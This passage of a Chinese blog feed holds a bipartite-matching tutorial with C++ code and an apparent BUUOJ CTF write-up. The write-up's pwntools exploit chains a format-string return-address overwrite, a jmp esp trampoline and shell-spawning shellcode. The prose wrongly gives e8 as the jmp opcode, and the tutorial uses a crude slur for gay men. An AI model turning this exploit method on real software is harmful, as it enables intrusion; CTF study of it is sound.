    <content type="html"><![CDATA[<p>然后今天来学二分图，首先我们来看看二分图的定义。</p><span id="more"></span><h2 id="二分图的定义"><a href="#二分图的定义" class="headerlink" title="二分图的定义"></a>二分图的定义</h2><p>首先二分图它是一个图(G)，由点集(V)和边集(E)构成的集合，即<code>G=(V,E)</code>。</p><p>除此之外它还满足一个特点，若这个图的点集存在一个<strong>划分</strong><code>&#123;V1,V2&#125;</code>使得，任意的<code>e(i,j,w)∈E</code>满足关系，<code>i∈V1,j∈V2</code>或者是<code>i∈V2,j∈V1</code>。那么这个图就被称为一个二分图。</p><p>以上是比较数学的说法，而且是自己DIY的(狗头。那说人话就是说，如果你能找到一个合理的方式把点划成两个部分，使得每条边的两个顶点均不同时属于一个部分。那么它就是一个二分图。反之，如果不存在这样的划分满足以上结果，那么它就不是一个二分图。</p><p>二分图的一个等价定义是：不含有<strong>含奇数条边的环</strong>的图。</p><p>如果说了这么多让你感觉到还是有一点点难以理解的话，那么我们换一个思路：假设把人比作点，把相爱关系比作边。假设这个人群内没有舔狗(恋情非单向)和男酮，那么它们的关系组成的图就会是一个二分图。时间管理大师(一人同时与多人)不影响它还是一个二分图的，只要没有同就行。不知道这个例子是否够抽象，更易于理解。</p><p>举个例子，如下图，它是不是一个二分图？</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>判断二分图可以用它的性质，显而易见的性质是什么：边连接的两个点一定属于不同集合。用刚刚那个例子再去讲的话就是：没有同的情况下，喜欢男孩的一定都是女孩，而这里我们划分就是以男孩女孩作为依据划分的，接着往下推又可以得到：喜欢<strong>喜欢男孩的人</strong>的人一定也是男孩。这里我们从1开始，假设1为男，那么5，7必为女，2，8，3必为男，6，4必为女。</p><p>我们就可以得到划分：<code>&#123;&#123;1,2,3,8&#125;,&#123;4,5,6,7&#125;&#125;</code>。那么我们稍微画的明显一点，将两个划分独立为两排，得到了以下图。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>为了方便，我们一般都会把二分图化成这种形式，可以很清楚的发现，同一排之间的点没有连线。那么你现在一定对二分图有了一个较为清楚的认识，那么可能会疑惑，这样的数据结构能用来处理什么样的问题呢？那么就涉及到我们接下来讲的概念了。</p><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ol><li>匹配(matching)：匹配其实就是一个边的集合，任意两条属于匹配的边都没有公共顶点，那么这个集合就叫做这个图的一个匹配。</li><li>匹配点：如果这个点存在于这个匹配的任意一条边上，那么这个点就是一个匹配点。</li><li>匹配边：如果这个边属于这个匹配，那么这就是一个匹配边。</li><li>非匹配点：与匹配点相对</li><li>非匹配边：与匹配边相对</li><li>最大匹配：在所有匹配中，所含边数量最多的称为最大匹配。</li><li>完美匹配：如果一个匹配中的所有边包含了一个图的所有点，即，一个图当中所有的点都为匹配点时，这个匹配称为完美匹配，并非所有的图都含有完美匹配，完美匹配一定是最大匹配。</li></ol><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>比如还是上面这个图，假设它们就是四男四女，我们要怎样做，才能尽可能保证它们都和自己喜欢的人凑成一对呢？这实际上就是要求二分图的最大匹配了，最大匹配我们一般是用匈牙利算法，对于匈牙利算法，我们需要再补充一点概念。</p><ol><li>交替路：如果从一个非匹配点出发，依次经过匹配边，非匹配边，匹配边，非匹配边……形成的路径就叫交替路。</li><li>增广路：如果交替路的终点为一个非匹配点，那么这条交替路我们又叫增广路。</li></ol><p>如下图</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p>红色点和红色边为匹配点和匹配边，这是一条增广路。</p><p>增广路的性质就是非匹配边会比匹配边多一条。如果我们把匹配边和非匹配边交换顺序，那么将会得到</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/4.png" alt="4"></p><p>可以到相比之前多了一个匹配边和两个匹配点。但是匹配顺序完全不一样了，原来是2，3匹配，4，5匹配，现在2，3和4，5都不在同一条匹配边上。</p><p>匈牙利算法的本质就是不停寻找增广路，增加匹配数目的。我们先不考虑匈牙利算法的代码，先徒手做一遍。首先我们需要匹配的点只有一边，另一边是被匹配的。</p><p>如最开始那个图，</p><p>从1开始，遍历边，先看1，5，发现5未被匹配，则直接匹配，结束。</p><p>那么现在的图是这样的。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/5.png" alt="5"></p><p>从2开始，2未被匹配，则寻找与它相连的边，找到(2,5)，但是发现5已经被匹配了，这个时候就要用到寻找增广路的思维了。那么我们直接沿着匹配边搜寻，就找到了1，然后从1开始找相连的边，因为不能反复横跳，所以我们只能选择7，发现7没被匹配，因此2-5-1-7构成增广路，找到增广路之后代表首位两个点参与进了匹配。然后交换匹配边与非匹配边。成了这样</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>这里我们不考虑最好的情况，因为我们自己很清楚3，6匹配，4，8匹配直接就完结撒花了。但是计算机不一定按照这样的方式去遍历，你要保证先后顺序不影响最终结果，即就算你选择5，最终算出来的最大匹配应当也是4。</p><p>这里我们选5，发现5被匹配了，于是找到2，但是2之后再也找不到路径了，因此(3,5)方向上的增广路寻找失败，所以就会找(3,6)，(3,6)直接匹配，我们看看最后这个8会怎么样呢，我们假设也是先找到了7，7会找到1，1会找到5，5找到2，发现2找不到增广路了，返回失败。所以最终选择了(8,4)。那么这样一整个就是匈牙利算法了。</p><p>这里用C代码大概写一下，假设存图采用链式前向星。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[MAX_EDGE];</span><br><span class="line"><span class="keyword">int</span> match[MAX_NODE],check[MAX_NODE],root[MAX_NODE];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//存储一边的点集</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">edge[++cnt].to=y;</span><br><span class="line">edge[cnt].next=root[x];</span><br><span class="line">root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">check[v]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">match[u]=v;</span><br><span class="line">match[v]=u;</span><br><span class="line">check[v]=<span class="literal">false</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(match[s[i]]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[s[i]]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">dfs</span>(s[i]))ans++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://www.luogu.com.cn/problem/P1129">洛谷P1129</a></p><p>小 Q 是一个非常聪明的孩子，除了国际象棋，他还很喜欢玩一个电脑益智游戏――矩阵游戏。矩阵游戏在一个 n \times n<em>n</em>×<em>n</em> 黑白方阵进行（如同国际象棋一般，只是颜色是随意的）。每次可以对该矩阵进行两种操作：</p><ul><li>行交换操作：选择矩阵的任意两行，交换这两行（即交换对应格子的颜色）。</li><li>列交换操作：选择矩阵的任意两列，交换这两列（即交换对应格子的颜色）。</li></ul><p>游戏的目标，即通过若干次操作，使得方阵的主对角线(左上角到右下角的连线)上的格子均为黑色。</p><p>对于某些关卡，小 Q 百思不得其解，以致他开始怀疑这些关卡是不是根本就是无解的！于是小 Q 决定写一个程序来判断这些关卡是否有解。</p><p>题意简单明了就是给一个01矩阵，问你能不能通过行交换与列交换将主对角线的元素都变成1。</p><p>那么其实就是每一行找到一个1，使得每个1处于不同的列。只要找到，那么经过若干次交换一定能使主对角线元素都为1。如果第一行的第三列存在一个1，那么就让1和3相连。当然因为这里的3不能和第三行混淆，所以我们选择列数+n作为二分图的另一个点集。所以我们只需要让行列都匹配那就完成了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">100000</span>];</span><br><span class="line"><span class="keyword">int</span> cnt,n,root[<span class="number">501</span>],check[<span class="number">500</span>],match[<span class="number">500</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="comment">//printf(&quot;%d %d\n&quot;,x,y);</span></span><br><span class="line">edge[++cnt].to=y;</span><br><span class="line">edge[cnt].next=root[x];</span><br><span class="line">root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">check[v]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">match[u]=v;</span><br><span class="line">match[v]=u;</span><br><span class="line">check[v]=<span class="literal">false</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(match[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[i]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">dfs</span>(i))ans++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)match[i]=<span class="number">-1</span>;</span><br><span class="line">cnt=<span class="number">0</span>;</span><br><span class="line">string s;</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line">cin&gt;&gt;x;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">add</span>(i,j+n);</span><br><span class="line"><span class="built_in">add</span>(j+n,i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">xyl</span>()==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里被卡了有点久，最后发现是数组越界，在使用前向星存无向图的时候一定要记得开两倍内存，不然写越界了很难说错误在哪。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>血淋淋的教训，并且失败的俩测试点没有报错re，而是wrong answer。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;然后今天来学二分图，首先我们来看看二分图的定义。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="二分图" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/%E4%BA%8C%E5%88%86%E5%9B%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>actf_2019_onerepeater writeup</title>
    <link href="http://example.com/2022/02/02/actf_2019_onerepeater%20writeup/"/>
    <id>http://example.com/2022/02/02/actf_2019_onerepeater%20writeup/</id>
    <published>2022-02-01T18:00:00.000Z</published>
    <updated>2022-02-02T12:26:28.320Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录，<a href="https://buuoj.cn/challenges#actf_2019_onerepeater">actf_2019_onerepeater</a></p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到elf文件<code>checksec</code>一波，无任何保护，栈可执行，那么多半是要把程序流劫持到栈上执行<code>shellcode</code>了，拖进ida里面。</p><p>![1](actf_2019_onerepeater writeup/1.png)</p><p>逻辑比较简单，菜单题，然后选项2是明显的格式化字符串漏洞，1选项就是读入<code>0x400</code>字节的数据。首先找到<code>jmp esp</code>的<code>gadget</code>。</p><p>![2](actf_2019_onerepeater writeup/2.png)</p><p>有就很好办了，利用格式化字符串改掉返回地址为这个gadget，然后再在后面写一个跳板指令跳到缓冲区内，只要在退出之前把缓冲区写上shellcode就可以很快<code>get shell</code>了。</p><p>先通过测试偏移，发现buf在格式化字符串函数的第16个参数。</p><p>![3](actf_2019_onerepeater writeup/3.png)</p><p>那么我们先把返回地址劫持了再说，经过调试发现返回地址在buf+0x41c的位置上。</p><p>写出部分exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="部分汇编知识"><a href="#部分汇编知识" class="headerlink" title="部分汇编知识"></a>部分汇编知识</h2><p>这里需要讲一讲汇编的知识了，因为我们在<code>jmp esp</code>的时候<code>esp</code>是指向我们返回地址的后面一格，所以<code>eip</code>等会会指向<code>ret_addr+4</code>的位置上，那么这个位置我们写些什么呢，当然直接写<code>shellcode</code>是肯定没问题的，实际操作也不会太难，一个循环解决，但是当复杂起来的时候这个就有点难，所以再需要一个跳板指令执行<code>jmp buf</code>，这里我们讲讲<code>jmp</code>的实现，<code>jmp</code>的编码是<code>5</code>个字节，其实有分大跳小跳，小跳只要两个字节，但是只能跳前后<code>0x7f</code>以内的位置。这里要跳到<code>buf</code>显然要用大跳了，大跳的编码是<code>e8</code> 后面跟上小端的<code>int</code>字节序。这个<code>int</code>字节呢代表偏移。</p><p>平时我们看到的<code>jmp 0x400689</code>这些实际编码都不是这样子编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 89 06 40 00</span><br></pre></td></tr></table></figure><p>而是会根据这个指令所处的位置，然后计算下一条指令到我要跳转的指令位置的数值作为jmp的参数。</p><p>举个例子，假如这个jmp 0x400689所处的位置是0x400500。那么它的编码将是</p><p>0x400689-(0x400500+5)=0x134</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 34 01 00 00</span><br></pre></td></tr></table></figure><p>这样子得到的。</p><p>如果是往低地址跳那就用负数表示。</p><p>这里呢我们要往<code>buf</code>跳，也就是低地址跳转，那么我们指令的位置是<code>buf+0x420</code>，所以得到偏移<code>0x425</code>，因为指令长度占了五个，跳转的起始位置是执行完这个指令的下一个位置。</p><p>取负数得到<code>0xfffffbdb</code>。</p><p>我们就得到了跳板指令的编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 db fb ff ff</span><br></pre></td></tr></table></figure><p>同样在下方部署这些字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么最后指令就会跳转到<code>buf</code>上，在选择3之前在<code>buf</code>上填一遍<code>shellcode</code>就完事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>![4](actf_2019_onerepeater writeup/4.png)</p><p>可以看到通过两次跳转，程序成功执行到了<code>shellcode</code>，然后就愉快的<code>cat flag</code> 吧</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./ACTF_2019_OneRepeater&#x27;</span>,port=<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span 